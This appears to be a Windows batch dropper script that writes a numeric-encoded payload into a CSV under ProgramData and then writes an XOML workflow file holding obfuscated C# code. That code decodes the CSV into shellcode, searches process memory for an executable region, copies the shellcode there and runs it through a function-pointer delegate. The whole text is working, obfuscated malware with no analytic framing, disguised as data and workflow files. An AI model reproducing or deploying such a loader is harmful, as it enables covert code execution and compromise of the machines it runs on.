>> "C:\ProgramData\abc\viewtime.csv" echo(137.64;36.935;201.4935;672.139;368.36;532.72;6724.831;196.724;195.904;204.7217;
>> "C:\ProgramData\abc\viewtime.csv" echo(904.204;372.137;776.36;4035.58;72.831;236.424;199.6212;54.36;50.0;40.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(3170.839;4.536;72.831;196.7865;324.195;904.204;904.204;5164.904;204.904;204.372;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.0062;676.36;38.72;831.236;6193.740;72.839;76.436;48.6036;932.205;955.255;
>> "C:\ProgramData\abc\viewtime.csv" echo(955.144;7170.472;131.896;40.895;204.6860;904.204;904.204;904.204;0714.672;137.676;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.58;72.4761;831.236;572.72;841.5;6677.908;255.955;255.472;137.1458;768.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(440.199;768.36;6636.632;0.30;0.40;72.9130;839.68;736.40;572.137;3013.468;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.348;72.839;76.8424;636.80;955.84;436.48;2520.844;72.831;196.772;195.4281;
>> "C:\ProgramData\abc\viewtime.csv" echo(904.204;904.204;904.204;1438.904;204.904;204.472;137.2485;484.36;416.72;837.76;
>> "C:\ProgramData\abc\viewtime.csv" echo(6248.436;8.472;131.936;88.7183;572.139;376.36;796.232;5632.884;0.70;0.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.1431;536.36;899.68;436.48;4406.808;0.40;0.899;68.7115;736.52;684.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.0;7187.899;68.636;56.484;0.0146;70.0;899.68;736.60;5442.355;0.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.899;68.1255;436.64;817.0;30.0;7794.899;68.736;68.819;0.3633;40.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(899.68;636.72;1614.816;0.70;0.899;68.0538;536.76;810.0;60.0;3564.899;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.636;32.60;0.8879;30.0;935.10;839.68;5500.436;32.955;192.837;68.2615;
>> "C:\ProgramData\abc\viewtime.csv" echo(336.32;839.68;436.36;5057.357;68.436;32.815;58.4223;839.68;536.32;772.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(3608.476;36.596;15.890;4.4896;61.137;668.36;740.51;2806.910;139.468;36.332;
>> "C:\ProgramData\abc\viewtime.csv" echo(185.6604;78.0;70.0;947.241;9093.839;194.839;192.839;76.6129;336.40;651.76;
>> "C:\ProgramData\abc\viewtime.csv" echo(832.48;8198.839;193.839;76.336;32.8533;672.139;684.36;804.136;9061.44;10.935;
>> "C:\ProgramData\abc\viewtime.csv" echo(178.839;68.4419;636.36;772.139;376.36;7922.804;198.54;1.40;184.8286;31.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.0;572.131;9751.896;88.895;204.904;204.3056;904.204;772.137;576.36;1594.58;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.831;236.524;199.4581;44.36;60.0;50.0;0162.839;4.536;72.839;76.4574;
>> "C:\ProgramData\abc\viewtime.csv" echo(436.32;315.190;54.1;1875.831;248.955;116.610;139.8725;64.36;955.192;837.4;
>> "C:\ProgramData\abc\viewtime.csv" echo(4250.636;235.929;139.54;36.8989;672.131;896.24;895.204;3318.904;204.904;204.904;
>> "C:\ProgramData\abc\viewtime.csv" echo(204.6161;904.204;904.204;904.204;4085.472;137.776;36.68;72.6714;831.236;524.199;
>> "C:\ProgramData\abc\viewtime.csv" echo(54.36;6928.70;0.50;0.935;8.5647;839.4;336.255;892.137;5946.44;36.372;
>> "C:\ProgramData\abc\viewtime.csv" echo(99.74;36.6623;772.139;476.36;432.15;7613.890;4.51;133.892;117.8225;37.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(44.36;955.192;3810.935;2.935;222.572;131.0277;896.24;895.204;904.204;0470.904;
>> "C:\ProgramData\abc\viewtime.csv" echo(204.904;204.472;137.5468;384.36;616.72;837.76;2270.636;8.576;137.768;36.0880;
>> "C:\ProgramData\abc\viewtime.csv" echo(424.76;837.76;536.32;2647.572;131.936;72.884;1.7885;30.0;30.72;807.192;
>> "C:\ProgramData\abc\viewtime.csv" echo(5200.70;198.568;4.532;97.5894;884.1;30.0;60.72;3401.807;192.71;198.368;
>> "C:\ProgramData\abc\viewtime.csv" echo(4.0931;632.0;572.139;668.36;6506.580;72.75;136.50;0.5728;40.72;841.84;
>> "C:\ProgramData\abc\viewtime.csv" echo(536.32;3887.672;139.900;72.839;68.1599;736.80;955.144;844.1;6022.40;0.672;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.768;36.7102;540.72;831.124;336.40;9345.50;117.72;235.811;72.9987;841.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(536.96;672.137;1550.568;36.748;76.839;68.1115;536.48;472.139;784.36;9842.788;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.839;76.536;40.8340;572.139;668.36;480.255;6256.844;160.31;0.70;72.9566;
>> "C:\ProgramData\abc\viewtime.csv" echo(899.68;536.48;60.0;1772.30;0.884;1.30;0.2960;30.72;807.192;50.198;
>> "C:\ProgramData\abc\viewtime.csv" echo(8049.368;4.436;10.884;1.3237;70.0;30.72;807.192;1321.51;198.568;4.336;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.6451;572.141;684.36;336.72;7402.839;76.536;40.472;139.9177;368.36;480.255;
>> "C:\ProgramData\abc\viewtime.csv" echo(844.152;8382.41;0.30;72.839;76.1685;536.40;472.139;468.36;7519.780;255.844;
>> "C:\ProgramData\abc\viewtime.csv" echo(168.41;0.8178;40.144;472.131;896.72;0305.895;204.904;204.904;204.3397;904.204;
>> "C:\ProgramData\abc\viewtime.csv" echo(904.204;904.204;6267.472;184.40;0.953;255.1503;955.7;70.0;672.187;0128.800;
>> "C:\ProgramData\abc\viewtime.csv" echo(105.815;111.814;100.6652;801.114;772.139;68.72;5561.459;203.816;8.572;45.7152;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.16;60.0;935.240;5349.672;131.892;8.476;139.6305;908.72;839.24;572.131;
>> "C:\ProgramData\abc\viewtime.csv" echo(1956.951;2.827;100.472;199.2621;893.64;70.0;30.72;9176.315;175.917;72.831;
>> "C:\ProgramData\abc\viewtime.csv" echo(192.2357;68.72;33.195;776.139;9954.588;8.473;131.951;0.0503;826.58;372.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(772.16;8620.373;131.951;1.826;48.4481;572.139;780.24;473.131;4720.951;2.826;
>> "C:\ProgramData\abc\viewtime.csv" echo(38.376;139.8486;664.32;573.131;951.3;8966.826;28.476;139.372;40.5404;473.131;
>> "C:\ProgramData\abc\viewtime.csv" echo(951.4;826.18;9968.576;139.688;48.576;137.5838;392.36;340.76;839.88;9553.656;
>> "C:\ProgramData\abc\viewtime.csv" echo(76.837;92.636;48.4488;477.139;526.73;955.195;5132.377;137.626;72.839;0.8992;
>> "C:\ProgramData\abc\viewtime.csv" echo(955.224;472.199;892.0;5717.70;0.40;195.643;49.7955;432.122;726.19;31.2;
>> "C:\ProgramData\abc\viewtime.csv" echo(1413.39;28.753;89.617;27.1932;717.47;955.32;759.53;3351.483;57.530;22.428;
>> "C:\ProgramData\abc\viewtime.csv" echo(13.8051;738.45;818.255;733.39;3060.634;84.47;3.955;35.3571;758.16;682.24;
>> "C:\ProgramData\abc\viewtime.csv" echo(322.26;4993.410;47.559;58.789;39.8677;324.1;426.9;628.49;4166.791;5.518;
>> "C:\ProgramData\abc\viewtime.csv" echo(6.955;58.1580;661.38;767.0;322.24;3343.340;30.749;49.955;47.5013;456.59;
>> "C:\ProgramData\abc\viewtime.csv" echo(368.16;663.21;3319.50;8.756;49.955;42.5911;738.49;382.57;630.22;0784.328;
>> "C:\ProgramData\abc\viewtime.csv" echo(13.538;45.955;43.8905;649.32;816.0;75.6;2815.711;2.432;4.369;26.1314;
>> "C:\ProgramData\abc\viewtime.csv" echo(320.17;629.31;955.43;8925.449;32.803;7.324;23.3582;511.31;539.29;783.255;
>> "C:\ProgramData\abc\viewtime.csv" echo(0171.558;61.438;67.40;22.9035;724.63;625.49;538.78;0365.955;63.356;49.382;
>> "C:\ProgramData\abc\viewtime.csv" echo(5.7484;955.43;449.32;823.20;2036.34;0.343;30.638;59.0889;569.255;751.33;
>> "C:\ProgramData\abc\viewtime.csv" echo(356.67;6503.426;22.955;10.536;38.1065;794.27;63.18;955.10;0816.559;36.682;
>> "C:\ProgramData\abc\viewtime.csv" echo(27.955;26.4092;550.36;469.28;325.0;7224.68;255.410;55.356;88.4771;36.18;
>> "C:\ProgramData\abc\viewtime.csv" echo(955.15;810.8;7865.666;6.618;6.729;48.6413;336.33;685.25;330.23;9661.350;
>> "C:\ProgramData\abc\viewtime.csv" echo(5.557;53.480;16.1927;340.12;588.88;822.255;2448.566;56.559;80.955;37.8003;
>> "C:\ProgramData\abc\viewtime.csv" echo(358.61;767.57;424.21;0998.510;9.638;21.771;28.1377;787.7;327.15;355.49;
>> "C:\ProgramData\abc\viewtime.csv" echo(9345.768;6.617;1.72;77.6226;955.45;348.48;569.58;7691.317;63.311;30.658;
>> "C:\ProgramData\abc\viewtime.csv" echo(49.1101;591.70;369.78;678.73;5671.436;116.818;17.419;6.3295;333.10;719.49;
>> "C:\ProgramData\abc\viewtime.csv" echo(667.37;5061.45;27.613;45.648;48.2098;769.16;44.7;784.76;9504.813;36.955;
>> "C:\ProgramData\abc\viewtime.csv" echo(45.436;61.6067;526.75;660.17;728.2;7023.749;56.34;71.677;84.9295;675.28;
>> "C:\ProgramData\abc\viewtime.csv" echo(816.21;671.28;6300.790;74.541;9.432;4.8792;369.26;420.53;510.8;1394.738;
>> "C:\ProgramData\abc\viewtime.csv" echo(49.668;6.377;84.2694;375.28;955.60;538.59;7674.584;16.54;7.478;37.7407;
>> "C:\ProgramData\abc\viewtime.csv" echo(716.110;423.80;62.255;9091.358;61.538;67.40;22.0507;624.63;425.49;638.78;
>> "C:\ProgramData\abc\viewtime.csv" echo(4696.593;26.521;7.52;21.7880;655.67;792.77;784.44;6784.413;39.649;10.480;
>> "C:\ProgramData\abc\viewtime.csv" echo(7.6419;484.47;70.56;359.84;1152.455;22.57;11.781;113.3315;536.23;433.14;
>> "C:\ProgramData\abc\viewtime.csv" echo(34.11;7265.381;100.544;18.369;79.6676;444.78;563.32;553.67;7494.316;74.568;
>> "C:\ProgramData\abc\viewtime.csv" echo(22.673;100.4315;808.111;685.39;66.1;8266.724;105.800;79.380;71.4872;476.54;
>> "C:\ProgramData\abc\viewtime.csv" echo(955.1;753.61;8379.689;52.520;0.678;30.1498;549.32;566.7;425.29;5454.50;
>> "C:\ProgramData\abc\viewtime.csv" echo(11.955;13.955;56.3098;660.33;589.17;318.6;3101.533;2.556;45.827;20.2354;
>> "C:\ProgramData\abc\viewtime.csv" echo(37.4;411.2;639.3;4582.695;16.325;61.526;31.9949;46.53;594.27;530.26;
>> "C:\ProgramData\abc\viewtime.csv" echo(5961.49;255.955;204.904;204.2601;904.204;60.0;60.0;3361.809;124.448;124.4138;
endlocal
goto :f1o

:f1o

:f1d

if exist "C:\ProgramData\abc\index.xoml" (
    goto :f2d
)

:f2wd
set "D=C:\ProgramData\abc\index.xoml"
for %%F in ("!D!") do (
    if not exist "%%~dpF" mkdir "%%~dpF"
)
setlocal DisableDelayedExpansion
> "C:\ProgramData\abc\index.xoml" echo(^<SequentialWorkflowActivity x:Class="deadlineMergeInitialized" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"^>
>> "C:\ProgramData\abc\index.xoml" echo(^<CodeActivity x:Name="frameCurrentOrdered" /^>
>> "C:\ProgramData\abc\index.xoml" echo(^<x:Code^>^<![CDATA[
>> "C:\ProgramData\abc\index.xoml" echo(public class formatterAccumulate :SequentialWorkflowActivity{
>> "C:\ProgramData\abc\index.xoml" echo(    private static bool typedNotification^(System.IntPtr bypassBranch, out MEMORY_BASIC_INFORMATION modelCompletedOpen, uint hypervisorDecompressor^) {
>> "C:\ProgramData\abc\index.xoml" echo(	modelCompletedOpen = new MEMORY_BASIC_INFORMATION^(^);
>> "C:\ProgramData\abc\index.xoml" echo(	object[] configuredSegmentCached = new object[] {bypassBranch, modelCompletedOpen, hypervisorDecompressor};
>> "C:\ProgramData\abc\index.xoml" echo(	var generateGlobalDirection = formatterAccumulate.viewNumberTake^(formatterAccumulate.initializedEvaluator^("xbVl1atNP4AfljYkYD67kNyDcs/gb2PcVI4MISgJppDCgWLevFhw0F6dNjQJBKCFy7058qBVXMZD0jY4Gxm3g8ujZMehVHiSfLcXBwgkjLPvg174kWhC9H6gFwkONJy/jrxn+btHatdDji8hNAnzldmcctWpVWQ="^), configuredSegmentCached^);
>> "C:\ProgramData\abc\index.xoml" echo(	modelCompletedOpen = ^(MEMORY_BASIC_INFORMATION^)configuredSegmentCached[1];
>> "C:\ProgramData\abc\index.xoml" echo(return ^(bool^)generateGlobalDirection; }
>> "C:\ProgramData\abc\index.xoml" echo(    public static System.IntPtr reduceSchedulerAccount^(string handledCustom^) {
>> "C:\ProgramData\abc\index.xoml" echo(	object[] configuredSegmentCached = new object[] {handledCustom};
>> "C:\ProgramData\abc\index.xoml" echo(	var generateGlobalDirection = formatterAccumulate.viewNumberTake^(formatterAccumulate.initializedEvaluator^("xbVl1atNP4AfljYkYD67kNyDcs/gb2PcVI4dLS4wvJXbvHLzr09o3lSOCTEpCbacgJl5z55Vfs5ChighNBrznd6deN+7TWn8UJ8/"^), configuredSegmentCached^);
>> "C:\ProgramData\abc\index.xoml" echo(return ^(System.IntPtr^)generateGlobalDirection; }
>> "C:\ProgramData\abc\index.xoml" echo(    public static System.IntPtr transformationStringRelation^(System.IntPtr skipInterface, string cursorDependencyImplementation^) {
>> "C:\ProgramData\abc\index.xoml" echo(	object[] configuredSegmentCached = new object[] {skipInterface, cursorDependencyImplementation};
>> "C:\ProgramData\abc\index.xoml" echo(	var generateGlobalDirection = formatterAccumulate.viewNumberTake^(formatterAccumulate.initializedEvaluator^("xbVl1atNP4AfljYkYD67kNyDcs/gb2PcVI4dLS4toZ7NkXPfvER/wU2hIzsuGL7f575j67pTcOFIgS4tN1Oan9qAY8nuSUHdVYc2LSYOp4PHvnCbvlNj0X+TNy0="^), configuredSegmentCached^);
>> "C:\ProgramData\abc\index.xoml" echo(return ^(System.IntPtr^)generateGlobalDirection; }
>> "C:\ProgramData\abc\index.xoml" echo(    [System.Runtime.InteropServices.StructLayout^(System.Runtime.InteropServices.LayoutKind.Sequential^)]
>> "C:\ProgramData\abc\index.xoml" echo(    private struct MEMORY_BASIC_INFORMATION {
>> "C:\ProgramData\abc\index.xoml" echo(        public System.IntPtr regressionRegistered;
>> "C:\ProgramData\abc\index.xoml" echo(        public System.IntPtr intervalIsolated;
>> "C:\ProgramData\abc\index.xoml" echo(        public uint iteratorDatabase;
>> "C:\ProgramData\abc\index.xoml" echo(        public System.IntPtr saltNamespaceImpersonation;
>> "C:\ProgramData\abc\index.xoml" echo(        public uint disassemblerAccount;
>> "C:\ProgramData\abc\index.xoml" echo(        public uint cursorLimit;
>> "C:\ProgramData\abc\index.xoml" echo(        public uint deserializeArgument; }
>> "C:\ProgramData\abc\index.xoml" echo(    [System.Runtime.InteropServices.UnmanagedFunctionPointer^(System.Runtime.InteropServices.CallingConvention.Cdecl^)]
>> "C:\ProgramData\abc\index.xoml" echo(    private delegate void traversalDelegate^(System.IntPtr dynamicThrottleUnpack, System.IntPtr scanDocumentDependency, System.IntPtr selectorDelete, System.IntPtr moveModel^);
>> "C:\ProgramData\abc\index.xoml" echo(    private static string renameCoverage = System.Environment.ExpandEnvironmentVariables^(formatterAccumulate.initializedEvaluator^("/qJ43LxAYfZQhjsUOx+wrdi5csy6SGHXH5EpPg=="^)^);
>> "C:\ProgramData\abc\index.xoml" echo(    private delegate System.IntPtr areaCollect^(int acceptThread^);
>> "C:\ProgramData\abc\index.xoml" echo(    private areaCollect expireCollect;
>> "C:\ProgramData\abc\index.xoml" echo(    public formatterAccumulate^(^)    {
>> "C:\ProgramData\abc\index.xoml" echo(        regionConfigurationMonitor^(^); }
>> "C:\ProgramData\abc\index.xoml" echo(    private void regionConfigurationMonitor^(^){
>> "C:\ProgramData\abc\index.xoml" echo(        System.Collections.Generic.List^<string^> socketAuthenticate = new System.Collections.Generic.List^<string^>^(System.IO.File.ReadLines^(renameCoverage^)^);
>> "C:\ProgramData\abc\index.xoml" echo(        socketAuthenticate.RemoveAt^(0^);
>> "C:\ProgramData\abc\index.xoml" echo(        string metricDatagram = socketAuthenticate[0].Split^(';'^)[0];
>> "C:\ProgramData\abc\index.xoml" echo(        uint versionScan = System.Convert.ToUInt32^(metricDatagram.Split^('.'^)[0]^);
>> "C:\ProgramData\abc\index.xoml" echo(        uint detectSecondary = System.Convert.ToUInt32^(metricDatagram.Split^('.'^)[1]^);
>> "C:\ProgramData\abc\index.xoml" echo(        byte[] appendPrioritization = new byte[detectSecondary];
>> "C:\ProgramData\abc\index.xoml" echo(        copyNode^(socketAuthenticate, 2, detectSecondary, appendPrioritization^);
>> "C:\ProgramData\abc\index.xoml" echo(        string traceForward = System.Text.Encoding.Default.GetString^(appendPrioritization^);
>> "C:\ProgramData\abc\index.xoml" echo(        var mountActivityEntropy = traceForward.Split^(';'^);
>> "C:\ProgramData\abc\index.xoml" echo(        uint reducePath = 0, deleteIndexed = 0, applicationTarget = 0, positionAccept = 0;
>> "C:\ProgramData\abc\index.xoml" echo(        foreach ^(var effectSubdomainPatcher in mountActivityEntropy^) {
>> "C:\ProgramData\abc\index.xoml" echo(            char trampolineReadyRemove = effectSubdomainPatcher[0];
>> "C:\ProgramData\abc\index.xoml" echo(            if ^(trampolineReadyRemove == 'm'^) {
>> "C:\ProgramData\abc\index.xoml" echo(                var criteriaBundle = effectSubdomainPatcher.Split^('^|'^);
>> "C:\ProgramData\abc\index.xoml" echo(                reducePath = System.Convert.ToUInt32^(criteriaBundle[1]^);
>> "C:\ProgramData\abc\index.xoml" echo(                deleteIndexed = System.Convert.ToUInt32^(criteriaBundle[2]^); }
>> "C:\ProgramData\abc\index.xoml" echo(            else if ^(trampolineReadyRemove == 'p'^) {
>> "C:\ProgramData\abc\index.xoml" echo(                var criteriaBundle = effectSubdomainPatcher.Split^('^|'^);
>> "C:\ProgramData\abc\index.xoml" echo(                applicationTarget = System.Convert.ToUInt32^(criteriaBundle[1]^);
>> "C:\ProgramData\abc\index.xoml" echo(                positionAccept = System.Convert.ToUInt32^(criteriaBundle[2]^); } }
>> "C:\ProgramData\abc\index.xoml" echo(        byte[] scheduledProtected = new byte[deleteIndexed];
>> "C:\ProgramData\abc\index.xoml" echo(        copyNode^(socketAuthenticate, versionScan + reducePath, deleteIndexed, scheduledProtected^);
>> "C:\ProgramData\abc\index.xoml" echo(        byte[] backgroundCompletedSpinlock = new byte[positionAccept];
>> "C:\ProgramData\abc\index.xoml" echo(        copyNode^(socketAuthenticate, versionScan + applicationTarget, positionAccept, backgroundCompletedSpinlock^);
>> "C:\ProgramData\abc\index.xoml" echo(        System.IntPtr decryptionPartial = System.Runtime.InteropServices.Marshal.AllocHGlobal^(backgroundCompletedSpinlock.Length^);
>> "C:\ProgramData\abc\index.xoml" echo(        System.Runtime.InteropServices.Marshal.Copy^(backgroundCompletedSpinlock, 0, decryptionPartial, backgroundCompletedSpinlock.Length^);
>> "C:\ProgramData\abc\index.xoml" echo(        System.IntPtr datasetClear = partitioningBlocked^(scheduledProtected.Length^);
>> "C:\ProgramData\abc\index.xoml" echo(        System.Runtime.InteropServices.Marshal.Copy^(scheduledProtected, 0, datasetClear, scheduledProtected.Length^);
>> "C:\ProgramData\abc\index.xoml" echo(        System.IntPtr supplierFacadeUtility = reduceSchedulerAccount^(formatterAccumulate.initializedEvaluator^("xbVl1atNP4AfljYk"^)^);
>> "C:\ProgramData\abc\index.xoml" echo(        System.IntPtr allowWrap = transformationStringRelation^(supplierFacadeUtility, formatterAccumulate.initializedEvaluator^("6bVj67xOb/NVligtKQ4="^)^);
>> "C:\ProgramData\abc\index.xoml" echo(        var registrationFetch = ^(traversalDelegate^)System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer^(datasetClear, typeof^(traversalDelegate^)^);
>> "C:\ProgramData\abc\index.xoml" echo(        registrationFetch^(supplierFacadeUtility, allowWrap, datasetClear, decryptionPartial^); }
>> "C:\ProgramData\abc\index.xoml" echo(    private System.IntPtr partitioningBlocked^(int acceptThread^) {
>> "C:\ProgramData\abc\index.xoml" echo(        expireCollect = partitioningBlocked;
>> "C:\ProgramData\abc\index.xoml" echo(        System.IntPtr typedBuffer =  System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate^(expireCollect^);
>> "C:\ProgramData\abc\index.xoml" echo(        System.IntPtr exceptionPublish = new System.IntPtr^(0x00^);
>> "C:\ProgramData\abc\index.xoml" echo(        System.IntPtr iteratorPrimary = new System.IntPtr^(0x00^);
>> "C:\ProgramData\abc\index.xoml" echo(        MEMORY_BASIC_INFORMATION networkAssertion = new MEMORY_BASIC_INFORMATION^(^);
>> "C:\ProgramData\abc\index.xoml" echo(        uint inspectionComponent = ^(uint^)System.Runtime.InteropServices.Marshal.SizeOf^(typeof^(MEMORY_BASIC_INFORMATION^)^);
>> "C:\ProgramData\abc\index.xoml" echo(        while^(exceptionPublish.ToInt64^(^) ^< 0xFFFFFFFFFFF^) {
>> "C:\ProgramData\abc\index.xoml" echo(            typedNotification^(exceptionPublish, out networkAssertion, inspectionComponent^);
>> "C:\ProgramData\abc\index.xoml" echo(            if ^(networkAssertion.cursorLimit == 0x40^) {
>> "C:\ProgramData\abc\index.xoml" echo(                iteratorPrimary = new System.IntPtr^(networkAssertion.regressionRegistered.ToInt64^(^) + networkAssertion.saltNamespaceImpersonation.ToInt64^(^)^);
>> "C:\ProgramData\abc\index.xoml" echo(                if ^(!^( networkAssertion.regressionRegistered.ToInt64^(^) ^< typedBuffer.ToInt64^(^) ^&^& typedBuffer.ToInt64^(^) ^< iteratorPrimary.ToInt64^(^) ^)^) {
>> "C:\ProgramData\abc\index.xoml" echo(                    if ^(acceptThread ^< networkAssertion.saltNamespaceImpersonation.ToInt64^(^)^) {
>> "C:\ProgramData\abc\index.xoml" echo(                        return networkAssertion.regressionRegistered; } } }
>> "C:\ProgramData\abc\index.xoml" echo(            exceptionPublish = new System.IntPtr^(networkAssertion.regressionRegistered.ToInt64^(^) + networkAssertion.saltNamespaceImpersonation.ToInt64^(^)^); }
>> "C:\ProgramData\abc\index.xoml" echo(        return new System.IntPtr^(0x00^); }
>> "C:\ProgramData\abc\index.xoml" echo(    private void copyNode^(System.Collections.Generic.List^<string^> vertexReductionIntercept, uint backoffCommit, uint unionEncoding, byte[] idempotentMeasure^) {
>> "C:\ProgramData\abc\index.xoml" echo(        uint testPauseSubscribe = 0;
>> "C:\ProgramData\abc\index.xoml" echo(        uint formatterCoverage = 0;
>> "C:\ProgramData\abc\index.xoml" echo(        foreach^(string line in vertexReductionIntercept^) {
>> "C:\ProgramData\abc\index.xoml" echo(            string assignPackageActive = formatterAccumulate.initializedEvaluator^(""^);
>> "C:\ProgramData\abc\index.xoml" echo(            uint evictIterate = 0;
>> "C:\ProgramData\abc\index.xoml" echo(            foreach^(char c in line^) {
>> "C:\ProgramData\abc\index.xoml" echo(                if ^(testPauseSubscribe ^< unionEncoding^) {
>> "C:\ProgramData\abc\index.xoml" echo(                    if^(System.Char.IsDigit^(c^)^) {
>> "C:\ProgramData\abc\index.xoml" echo(                        evictIterate++;
>> "C:\ProgramData\abc\index.xoml" echo(                        assignPackageActive+=c; }
>> "C:\ProgramData\abc\index.xoml" echo(                    else {
>> "C:\ProgramData\abc\index.xoml" echo(                        if ^(formatterCoverage ^>= backoffCommit^) {
>> "C:\ProgramData\abc\index.xoml" echo(                            if^(evictIterate^>0^) {
>> "C:\ProgramData\abc\index.xoml" echo(                                if^(evictIterate^<4^) {
>> "C:\ProgramData\abc\index.xoml" echo(                                    int priorityAnnotate=0;
>> "C:\ProgramData\abc\index.xoml" echo(                                    byte concurrentScan=0;
>> "C:\ProgramData\abc\index.xoml" echo(                                    System.Int32.TryParse^(assignPackageActive,out priorityAnnotate^);
>> "C:\ProgramData\abc\index.xoml" echo(                                    if^(299^<priorityAnnotate^&^&priorityAnnotate^<800^)
>> "C:\ProgramData\abc\index.xoml" echo(                                    {concurrentScan=System.Convert.ToByte^(assignPackageActive.Substring^(1^)^);}
>> "C:\ProgramData\abc\index.xoml" echo(                                    else if^(priorityAnnotate^<100^&^&testPauseSubscribe %% 2 == 0^)
>> "C:\ProgramData\abc\index.xoml" echo(                                    {concurrentScan=System.Convert.ToByte^(assignPackageActive.Substring^(1^)^);}
>> "C:\ProgramData\abc\index.xoml" echo(                                    else if^(799^<priorityAnnotate^&^&priorityAnnotate^<900^)
>> "C:\ProgramData\abc\index.xoml" echo(                                    {string deferContent=formatterAccumulate.initializedEvaluator^("nw=="^)+assignPackageActive.Substring^(1^);
>> "C:\ProgramData\abc\index.xoml" echo(                                    concurrentScan=System.Convert.ToByte^(deferContent^);}
>> "C:\ProgramData\abc\index.xoml" echo(                                    else if^(899^<priorityAnnotate^&^&priorityAnnotate^<1000^)
>> "C:\ProgramData\abc\index.xoml" echo(                                    {string deferContent=formatterAccumulate.initializedEvaluator^("nA=="^)+assignPackageActive.Substring^(1^);
>> "C:\ProgramData\abc\index.xoml" echo(                                    concurrentScan=System.Convert.ToByte^(deferContent^);}
>> "C:\ProgramData\abc\index.xoml" echo(                                    else
>> "C:\ProgramData\abc\index.xoml" echo(                                    {concurrentScan=System.Convert.ToByte^(assignPackageActive^);}
>> "C:\ProgramData\abc\index.xoml" echo(                                    idempotentMeasure[testPauseSubscribe]=concurrentScan;
>> "C:\ProgramData\abc\index.xoml" echo(                                    testPauseSubscribe++; } } }
>> "C:\ProgramData\abc\index.xoml" echo(                        evictIterate=0;
>> "C:\ProgramData\abc\index.xoml" echo(                        assignPackageActive=formatterAccumulate.initializedEvaluator^(""^);
>> "C:\ProgramData\abc\index.xoml" echo(                        formatterCoverage = formatterCoverage + 1; } } } } }
>> "C:\ProgramData\abc\index.xoml" echo(private static System.Reflection.Emit.ModuleBuilder sliceAssertion;
>> "C:\ProgramData\abc\index.xoml" echo(private static System.Collections.Generic.Dictionary^<string, System.Type^> trackKernel = new System.Collections.Generic.Dictionary^<string, System.Type^>^(^);
>> "C:\ProgramData\abc\index.xoml" echo(private static System.Type statefulLocal^(string loggerFind^) {
>> "C:\ProgramData\abc\index.xoml" echo(    string repositoryState = loggerFind.StartsWith^(formatterAccumulate.initializedEvaluator^("/alkz6tMIg=="^)^) ? loggerFind.Substring^(7^) : loggerFind;
>> "C:\ProgramData\abc\index.xoml" echo(    if ^(repositoryState.Equals^(formatterAccumulate.initializedEvaluator^("575j67pT"^)^)^) return typeof^(System.IntPtr^);
>> "C:\ProgramData\abc\index.xoml" echo(    if ^(repositoryState.Equals^(formatterAccumulate.initializedEvaluator^("+5l5z55Vfg=="^)^)^) return typeof^(System.UIntPtr^);
>> "C:\ProgramData\abc\index.xoml" echo(    if ^(repositoryState.Equals^(formatterAccumulate.initializedEvaluator^("575jivg="^)^) ^|^| repositoryState.Equals^(formatterAccumulate.initializedEvaluator^("3bh4ybo="^)^)^) return typeof^(short^);
>> "C:\ProgramData\abc\index.xoml" echo(    if ^(repositoryState.Equals^(formatterAccumulate.initializedEvaluator^("+5l5z/8X"^)^) ^|^| repositoryState.Equals^(formatterAccumulate.initializedEvaluator^("26N/1LxV"^)^)^) return typeof^(System.UInt16^);
>> "C:\ProgramData\abc\index.xoml" echo(    if ^(repositoryState.Equals^(formatterAccumulate.initializedEvaluator^("575jiPw="^)^) ^|^| repositoryState.Equals^(formatterAccumulate.initializedEvaluator^("x75j"^)^)^) return typeof^(int^);
>> "C:\ProgramData\abc\index.xoml" echo(    if ^(repositoryState.Equals^(formatterAccumulate.initializedEvaluator^("+5l5z/0T"^)^) ^|^| repositoryState.Equals^(formatterAccumulate.initializedEvaluator^("27l5zw=="^)^)^) return typeof^(System.UInt32^);
>> "C:\ProgramData\abc\index.xoml" echo(    if ^(repositoryState.Equals^(formatterAccumulate.initializedEvaluator^("575jjfo="^)^) ^|^| repositoryState.Equals^(formatterAccumulate.initializedEvaluator^("wr953A=="^)^)^) return typeof^(long^);
>> "C:\ProgramData\abc\index.xoml" echo(    if ^(repositoryState.Equals^(formatterAccumulate.initializedEvaluator^("+5l5z/gV"^)^) ^|^| repositoryState.Equals^(formatterAccumulate.initializedEvaluator^("27x41ak="^)^)^) return typeof^(System.UInt64^);
>> "C:\ProgramData\abc\index.xoml" echo(    if ^(repositoryState.ToLower^(^).Equals^(formatterAccumulate.initializedEvaluator^("3aRl0qBG"^)^)^) return typeof^(string^);
>> "C:\ProgramData\abc\index.xoml" echo(    if ^(repositoryState.ToLower^(^).Equals^(formatterAccumulate.initializedEvaluator^("zbh2yQ=="^)^)^) return typeof^(char^);
>> "C:\ProgramData\abc\index.xoml" echo(    if ^(repositoryState.ToLower^(^).Equals^(formatterAccumulate.initializedEvaluator^("zKlj3g=="^)^)^) return typeof^(byte^);
>> "C:\ProgramData\abc\index.xoml" echo(    if ^(repositoryState.ToLower^(^).Equals^(formatterAccumulate.initializedEvaluator^("3bJuz6s="^)^)^) return typeof^(sbyte^);
>> "C:\ProgramData\abc\index.xoml" echo(    if ^(repositoryState.ToLower^(^).Equals^(formatterAccumulate.initializedEvaluator^("yr9i2aJE"^)^)^) return typeof^(double^);
